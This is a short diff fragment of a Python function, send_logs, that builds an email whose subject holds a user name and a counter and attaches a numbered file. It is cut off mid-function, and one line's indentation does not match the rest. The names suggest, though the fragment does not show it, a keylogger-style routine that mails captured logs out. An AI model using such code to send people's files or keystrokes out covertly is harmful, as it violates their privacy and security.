@@ -91,3 +91,15 @@ def send_logs():
 				write_file(count)
 
 				subject = f'[{user}] ~ {count}'
+				
+                msg = MIMEMultipart()
+				msg['From'] = fromAddr
+				msg['To'] = toAddr
+				msg['Subject'] = subject
+				body = 'testing'
+				msg.attach(MIMEText(body,'plain'))
+
+				attachment = open(delete_file[0],'rb')
+				print('attachment')
+
+				filename = delete_file[0].split('/')[2]
